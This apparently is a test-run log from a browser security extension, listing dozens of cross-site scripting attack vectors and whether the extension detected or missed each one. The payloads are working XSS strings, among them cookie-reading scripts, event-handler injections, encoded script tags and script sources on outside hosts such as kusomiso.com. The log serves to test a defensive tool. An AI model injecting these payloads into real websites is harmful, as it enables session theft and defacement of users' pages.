+IndexedDB logs: OriginalPayload: <ul onmouseup="alert(1)" style=display:block>AnonKryptiQuz</ul>
+✅ Detected payload: <ul onmouseup="alert(1)" style=display:block>AnonKryptiQuz</ul>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64312
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E&ToDo=se<br/>arch
+✅ Detected payload: query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E&ToDo=se<br/>arch
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64313
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <rp draggable="true" ondragstart="alert(1)">test</rp>
+✅ Detected payload: <rp draggable="true" ondragstart="alert(1)">test</rp>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64314
+pressed
+Handling alerts
+No logs detected
+IndexedDB logs:
+❌ Missed payload: pollId=qe5zen49gsgyzk3h&adminKey=&participantKey=&iEdit=yep
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64315
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <ruby draggable="true" ondragenter="alert(1)">AnonKryptiQuz</ruby>
+✅ Detected payload: <ruby draggable="true" ondragenter="alert(1)">AnonKryptiQuz</ruby>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64316
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">
+✅ Detected payload: <META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64317
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <tbody oncopy=alert(1) value="AnonKryptiQuz" autofocus tabindex=1 style=display:block>AnonKryptiQuz
+✅ Detected payload: <tbody oncopy=alert(1) value="AnonKryptiQuz" autofocus tabindex=1 style=display:block>AnonKryptiQuz
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64318
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <wbr id=x tabindex=1 onbeforedeactivate=alert(1)></wbr><input autofocus>
+✅ Detected payload: <wbr id=x tabindex=1 onbeforedeactivate=alert(1)></wbr><input autofocus>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64319
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: "></tag><svg onload=alert(spyerror)>
+✅ Detected payload: "></tag><svg onload=alert(spyerror)>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64320
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: confirm(window.toStaticHTML('<base href="http://xss.cx/"></base>'));
+✅ Detected payload: confirm(window.toStaticHTML('<base href="http://xss.cx/"></base>'));
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64321
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: type=8%27%22%3E%3C/title%<br/>3E%3Cscript%3Ealert(1337)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee<br/>%3E%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylit<br/>ol%3C/h1%3E%3C/marquee%3E
+✅ Detected payload: type=8%27%22%3E%3C/title%<br/>3E%3Cscript%3Ealert(1337)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee<br/>%3E%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylit<br/>ol%3C/h1%3E%3C/marquee%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64322
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: tarihte=ara&gun=31&ay=2&yil="><script>alert(document.cookie)</s<br/>cript>
+✅ Detected payload: tarihte=ara&gun=31&ay=2&yil="><script>alert(document.cookie)</s<br/>cript>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64323
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: docid=%22%3E%3Cscript%3Ealert(1337)%3C/script%3E
+✅ Detected payload: docid=%22%3E%3Cscript%3Ealert(1337)%3C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64324
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <applet onpointerdown=alert(1)>XSS</applet>
+✅ Detected payload: <applet onpointerdown=alert(1)>XSS</applet>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64325
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: doc_no=0000579295&title="><script>alert(document.cookie)</sc<br/>ript>
+✅ Detected payload: doc_no=0000579295&title="><script>alert(document.cookie)</sc<br/>ript>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64326
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <dd onpointerenter=alert(1)>XSS</dd>
+✅ Detected payload: <dd onpointerenter=alert(1)>XSS</dd>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64327
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: lang=pt-br&title=<script>alert('xss%20<br/>by%20bugbuster')</script>&clipurl=lala!asx&cs=news&lp=0&mt=v
+✅ Detected payload: lang=pt-br&title=<script>alert('xss%20<br/>by%20bugbuster')</script>&clipurl=lala!asx&cs=news&lp=0&mt=v
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64328
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <option oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+✅ Detected payload: <option oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64329
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: search=%22%3E%27%3E%3CscRipT%3Ealert%28123%29%3C%2FscRipT%3E&x=12&y<br/>=10
+✅ Detected payload: search=%22%3E%27%3E%3CscRipT%3Ealert%28123%29%3C%2FscRipT%3E&x=12&y<br/>=10
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64330
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <html onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</html><input value=clickme>
+✅ Detected payload: <html onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</html><input value=clickme>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64331
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <colgroup draggable="true" ondrag="alert(1)">test</colgroup>
+✅ Detected payload: <colgroup draggable="true" ondrag="alert(1)">test</colgroup>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64332
+pressed
+Handling alerts
+No logs detected
+IndexedDB logs:
+❌ Missed payload: qt=bycat&cat='%22%3E%3Ciframe%20src=http://pc-kopat.us/hacked<br/>/%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64333
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <image3 onmouseup="alert(1)" style=display:block>test</image3>
+✅ Detected payload: <image3 onmouseup="alert(1)" style=display:block>test</image3>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64334
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <dt onpointerdown=alert(1)>XSS</dt>
+✅ Detected payload: <dt onpointerdown=alert(1)>XSS</dt>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64335
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: >"<div style="width: expression(document.cookie=true;);">
+✅ Detected payload: >"<div style="width: expression(document.cookie=true;);">
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64336
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <// style=x:expression\28javascript:alert(1)\29>
+✅ Detected payload: <// style=x:expression\28javascript:alert(1)\29>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64337
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: page="><script>alert(document.cookie)</script>><marquee><h1<br/>>BackDoor</h1></marquee>
+✅ Detected payload: page="><script>alert(document.cookie)</script>><marquee><h1<br/>>BackDoor</h1></marquee>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64338
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <input id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>
+✅ Detected payload: <input id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64339
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: &lt;IMG SRC=\&quot;   sanitized-javascript:alert(&#x27;AnonKryptiQuz&#x27;);\&quot;&gt;
+✅ Detected payload: &lt;IMG SRC=\"   javascript&#058;alert('AnonKryptiQuz');\"&gt;
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64340
+pressed
+Handling alerts
+No logs detected
+IndexedDB logs:
+❌ Missed payload: pageName=%22%3E%3Cimg%20src=http://i48.tinypic.com/zx7<br/>7te.jpg%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64341
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: forumId=11088%3C/script%3E%3Cscript%3Ealert('Airroxssed');%3<br/>C/script%3E
+✅ Detected payload: forumId=11088%3C/script%3E%3Cscript%3Ealert('Airroxssed');%3<br/>C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64342
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <caption onmouseleave="alert(1)" style=display:block>AnonKryptiQuz</caption>
+✅ Detected payload: <caption onmouseleave="alert(1)" style=display:block>AnonKryptiQuz</caption>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64343
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <isindex onbeforepaste="alert(1)" contenteditable>AnonKryptiQuz</isindex>
+✅ Detected payload: <isindex onbeforepaste="alert(1)" contenteditable>AnonKryptiQuz</isindex>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64344
+pressed
+Handling alerts
+No logs detected
+IndexedDB logs:
+❌ Missed payload: b=String.fromCharCode.apply(null,a);var c=[88,115,112,108,111,105,116];var d=String.fromCharCode.apply(null,c);window[b](d);})()</sCrIpT>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64345
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: qu="<script>alert("HACKED")</script>
+✅ Detected payload: qu="<script>alert("HACKED")</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64346
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <IMG SRC=" &#14;  javascript:alert('AnonKryptiQuz');">
+✅ Detected payload: <IMG SRC=" &#14;  javascript:alert('AnonKryptiQuz');">
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64347
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <hr oncontextmenu="alert(1)">test</hr>
+✅ Detected payload: <hr oncontextmenu="alert(1)">test</hr>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64348
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: searchField=%3Ch1%3ERME%3C/h1%3E%3Ciframe%20src=%22http://xss<br/>ed.com%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+✅ Detected payload: searchField=%3Ch1%3ERME%3C/h1%3E%3Ciframe%20src=%22http://xss<br/>ed.com%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64349
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: lang=%22%3E%3Cscript%3Ealert(/XSS/)%3C/script%3E&page=web_conten<br/>t&id_content=2000
+✅ Detected payload: lang=%22%3E%3Cscript%3Ealert(/XSS/)%3C/script%3E&page=web_conten<br/>t&id_content=2000
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64350
+pressed
+Handling alerts
+No logs detected
+IndexedDB logs:
+❌ Missed payload: option=com_search&Itemid=99999999&searchword="><iframe><h1>ube<br/>r0n&submit=Szukaj&searchphrase=any&ordering=newest
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64351
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: q=%3C%2Ftitle%3E%3Cscript%3Ealert(666)%3C%2Fscript%3E&t=m&button=B<br/>uscar!
+✅ Detected payload: q=%3C%2Ftitle%3E%3Cscript%3Ealert(666)%3C%2Fscript%3E&t=m&button=B<br/>uscar!
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64352
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: page=%22%3E'%3E%3Cscript%3Ealert(document.cookie)%3C/scr<br/>ipt%3E
+✅ Detected payload: page=%22%3E'%3E%3Cscript%3Ealert(document.cookie)%3C/scr<br/>ipt%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64353
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <section onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</section><input value=clickme>
+✅ Detected payload: <section onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</section><input value=clickme>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64354
+pressed
+Handling alerts
+No logs detected
+IndexedDB logs:
+❌ Missed payload: q=%3Cmarquee%3E%3Ch1%3Esl4xUz%3C/marquee%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64355
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: p2=O&rech=%3Cscript%3Ealert(123)%3C/script%3E%20%3Cscript%3E<br/>alert(123)%3C/script%3E
+✅ Detected payload: p2=O&rech=%3Cscript%3Ealert(123)%3C/script%3E%20%3Cscript%3E<br/>alert(123)%3C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64356
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <div draggable="true" contenteditable>drag me</div><video ondragover=alert(1) contenteditable style=display:block>drop here</video>
+✅ Detected payload: <div draggable="true" contenteditable>drag me</div><video ondragover=alert(1) contenteditable style=display:block>drop here</video>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64357
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: q=%3C%2Fscript%3E%3Cscript%3Ealert%285%29%3C%2Fscript%3E
+✅ Detected payload: q=%3C%2Fscript%3E%3Cscript%3Ealert%285%29%3C%2Fscript%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64358
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <fieldset onmouseenter="alert(1)" style=display:block>test</fieldset>
+✅ Detected payload: <fieldset onmouseenter="alert(1)" style=display:block>test</fieldset>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64359
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: /%2527)%253B%2520alert(document.cookies)%253B%252F%252F
+✅ Detected payload: /%2527)%253B%2520alert(document.cookies)%253B%252F%252F
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64360
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <main oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+✅ Detected payload: <main oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64361
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: s=%3C/title%3E%3Cscript%3Ealert(/xssed/);%3C/script%3E%3C/head%3E<br/>%3C!--
+✅ Detected payload: s=%3C/title%3E%3Cscript%3Ealert(/xssed/);%3C/script%3E%3C/head%3E<br/>%3C!--
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64362
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: style=%3Cscript%3Ealert('The Milk Man')%3C/script%3E
+✅ Detected payload: style=%3Cscript%3Ealert('The Milk Man')%3C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64363
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <rtc oncut=alert(1) value="AnonKryptiQuz" autofocus tabindex=1 style=display:block>AnonKryptiQuz
+✅ Detected payload: <rtc oncut=alert(1) value="AnonKryptiQuz" autofocus tabindex=1 style=display:block>AnonKryptiQuz
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64364
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <body onkeyup body onkeyup="javascript:javascript:alert(3112)"></body onkeyup>
+✅ Detected payload: <body onkeyup body onkeyup="javascript:javascript:alert(3112)"></body onkeyup>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64365
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: AcronymOptions=Begins'%3E%22%3E%3CSCRIPT/SRC=http<br/>://kusomiso.com/xss.js%3E%3C/SCRIPT%3Eth:&Acronym=&definition=&Source=All
+✅ Detected payload: AcronymOptions=Begins'%3E%22%3E%3CSCRIPT/SRC=http<br/>://kusomiso.com/xss.js%3E%3C/SCRIPT%3Eth:&Acronym=&definition=&Source=All
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64366
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <video2 onwebkitmouseforcedown=alert(1)>XSS</video2>
+✅ Detected payload: <video2 onwebkitmouseforcedown=alert(1)>XSS</video2>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64367
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <track draggable="true" ondragleave="alert(1)" style=display:block>AnonKryptiQuz</track>
+✅ Detected payload: <track draggable="true" ondragleave="alert(1)" style=display:block>AnonKryptiQuz</track>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64368
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <details onpointerdown=alert(1)>XSS</details>
+✅ Detected payload: <details onpointerdown=alert(1)>XSS</details>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64369
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: programa=%3Cscript%3Ealert(1);document.write(%22%3Ch1%&lt;br/&gt;3E0WN3D%3C/H1%3E%22)%3C/script%3E
+✅ Detected payload: programa=%3Cscript%3Ealert(1);document.write(%22%3Ch1%<br/>3E0WN3D%3C/H1%3E%22)%3C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64370
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <details onmouseover="alert(1)">AnonKryptiQuz</details>
+✅ Detected payload: <details onmouseover="alert(1)">AnonKryptiQuz</details>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64371
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: aid=5&ps=DAUSUE&Keywords=%3Cscript%3Ealert%28/xss/%29%3B%3C/script%3E
+✅ Detected payload: aid=5&ps=DAUSUE&Keywords=%3Cscript%3Ealert%28/xss/%29%3B%3C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64372
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: &lt;IMG SRC=sanitized-javascript:alert(&quot;XSS&quot;)&gt;
+✅ Detected payload: &lt;IMG SRC=javascript&#058;alert(&quot;XSS&quot;)&gt;
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64373
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <blockquote oncopy=alert(1) value="AnonKryptiQuz" autofocus tabindex=1 style=display:block>AnonKryptiQuz
+✅ Detected payload: <blockquote oncopy=alert(1) value="AnonKryptiQuz" autofocus tabindex=1 style=display:block>AnonKryptiQuz
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64374
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: islem=gruplar&grup=<script>alert("GormYa")</script>
+✅ Detected payload: islem=gruplar&grup=<script>alert("GormYa")</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64375
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: nedir="><script>alert('cyber')</script>
+✅ Detected payload: nedir="><script>alert('cyber')</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64376
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <button onmousemove="alert(1)" style=display:block>test</button>
+✅ Detected payload: <button onmousemove="alert(1)" style=display:block>test</button>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64377
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: search="<script>alert("HACKED")</script>&submit=Search+%3E%3E&mode<br/>=allwords
+✅ Detected payload: search="<script>alert("HACKED")</script>&submit=Search+%3E%3E&mode<br/>=allwords
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64378
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: sf=%3Cscript%3Ealert('Hello%20World')%3C/script%3E
+✅ Detected payload: sf=%3Cscript%3Ealert('Hello%20World')%3C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64379
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <SCRIPT a=">'>" SRC="httx://.rocks/.js"></SCRIPT>
+✅ Detected payload: <SCRIPT a=">'>" SRC="httx://.rocks/.js"></SCRIPT>
+
+------------------------------------------------------------------------------------------
+
+Execution time: 38457.6208050251  seconds
+PS D:\sai\web_sec_extension\Implementation\Testing\selenium_scripts>
